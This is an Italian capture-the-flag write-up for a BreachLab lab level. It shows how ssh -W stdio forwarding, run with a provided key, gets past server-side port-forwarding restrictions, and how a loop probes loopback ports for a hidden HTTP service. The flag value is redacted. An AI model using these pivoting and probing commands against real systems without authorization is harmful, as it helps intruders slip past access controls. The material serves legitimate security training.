# Phantom Track - Phantom 16

## Sommario

- Track: Phantom Track
- Livello: Phantom 16 — The Tunnel
- Fonte appunti: `phantom_track/phantom16/notes.md`

## Obiettivo

Dal BRIEFING del livello:

```text
MISSION: The Tunnel
==================

You are on the entry host (10.13.37.2) of phantom-net (10.13.37.0/24).
The flag for this level is served by an HTTP service on 10.13.37.30.
The service is bound to loopback only — direct TCP from this host will
be refused.

Materials:
  ~/.ssh/id_ed25519_ops    — private key for ops@10.13.37.30

SSH is more than a login shell. Read the options on the client side and
figure out how to reach a loopback-bound service through a bastion you
already own.
```

Obiettivo: dall'entry host `10.13.37.2` raggiungere un servizio HTTP legato solo a `127.0.0.1` sull'host `10.13.37.30`, usando SSH come bastion con la chiave privata fornita.

## Ricognizione

Prima serie di tentativi con port forwarding locale classico (`-L`):

```bash
ssh -L 8080:localhost:80 ops@10.13.37.30
ops@10.13.37.30: Permission denied (publickey).
```

Serve specificare esplicitamente la chiave privata fornita:

```bash
ssh -i ./.ssh/id_ed25519_ops -L 8080:localhost:80 ops@10.13.37.30
PTY allocation request failed on channel 2
^C
```

L'allocazione di un PTY fallisce (indicando una shell interattiva ristretta o disabilitata sull'account `ops`). Provando `-N` (nessun comando remoto, solo forwarding) in background:

```bash
ssh -i ./.ssh/id_ed25519_ops -L 8080:localhost:80 ops@10.13.37.30 -N &
curl http://localhost:8080
channel 2: open failed: administratively prohibited: open failed
curl: (56) Recv failure: Connection reset by peer
```

Il forwarding locale classico viene rifiutato lato server con `administratively prohibited`, sintomo tipico di una configurazione server-side che disabilita il `-L`/port-forwarding "a listener" (es. restrizioni in `authorized_keys` o `sshd_config` come `no-port-forwarding` / `PermitOpen`), pur permettendo comunque connessioni SSH.

Tentativo di eseguire direttamente un comando remoto per bypassare il problema:

```bash
ssh -i ./.ssh/id_ed25519_ops ops@10.13.37.30 curl http://127.0.0.1:80
restricted endpoint
```

L'account `ops` risponde con `restricted endpoint`: anche l'esecuzione di comandi arbitrari è vietata (probabile `command=` forzato in `authorized_keys`), confermando che l'accesso è limitato a un uso molto specifico del canale SSH.

## Tecnica

Quando `-L` (local port forwarding con listener) è bloccato da restrizioni server-side ma il client possiede comunque una chiave valida per instaurare una sessione SSH, un'alternativa è l'opzione `-W host:port` del client OpenSSH: apre un singolo canale TCP diretto (stdio-forwarding) verso `host:port` attraverso la connessione SSH, senza richiedere l'apertura di un listener locale né l'esecuzione di comandi remoti arbitrari. Di fatto, standard input/output del client SSH vengono collegati direttamente al socket remoto.

Questo permette di instradare a mano una richiesta HTTP grezza (scritta come testo RAW HTTP/1.0) attraverso il tunnel, bypassando le restrizioni configurate per il port-forwarding "classico" — perché `-W` sfrutta un meccanismo di forwarding diverso, spesso non coperto dalle stesse direttive restrittive.

## Sfruttamento

1. Tentativo (fallito) di stdio-forwarding diretto sulla porta 80:

```bash
echo -e "GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n" | ssh -i ./.ssh/id_ed25519_ops -W 127.0.0.1:80 ops@10.13.37.30
channel 0: open failed: administratively prohibited: open failed
stdio forwarding failed
```

Anche la porta 80 risulta esplicitamente bloccata: il servizio HTTP non è (o non è più) in ascolto lì, oppure quella porta specifica è nella lista nera del server.

2. Ipotesi: il servizio HTTP potrebbe essere in ascolto su una porta diversa dalla 80. Scansione manuale delle porte comuni via loop, riutilizzando `-W` per ciascun tentativo e inviando una richiesta HTTP/1.0 grezza:

```bash
for port in 80 8080 8000 3000 5000; do
  echo -e "GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n" | ssh -i ./.ssh/id_ed25519_ops -W 127.0.0.1:$port ops@10.13.37.30 2>/dev/null
done
```

3. Una delle porte risponde con una risposta HTTP valida, servita da un semplice server Python:

```
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.10.12
Date: Sun, 28 Jun 2026 15:32:04 GMT
Content-Type: text/plain
Content-Length: 27

<REDACTED_FLAG>
```

## Risultato

Usando `ssh -W host:port` per instradare manualmente una richiesta HTTP grezza attraverso il tunnel SSH (bypassando le restrizioni sul port-forwarding classico), è stato possibile raggiungere il servizio HTTP bound a loopback su `10.13.37.30` e recuperare la flag del livello:

```
<REDACTED_FLAG>
```

## Nota di pubblicazione

Questa è la versione pensata per pubblicazione su GitHub, secondo la dottrina BreachLab: il metodo (individuazione delle restrizioni di port-forwarding, uso di `ssh -W` per lo stdio-forwarding, costruzione manuale di una richiesta HTTP raw, scansione delle porte comuni) è spiegato per intero — comandi, percorsi e sintassi restano in chiaro — ma il valore letterale della flag, che appare due volte identica nelle note originali, è stato rimosso in entrambe le occorrenze.

## Crediti

Livello risolto su BreachLab — https://breachlab.org (Phantom Track). Writeup pubblicato nel rispetto delle regole della piattaforma: si insegna la tecnica, non si condivide la risposta.
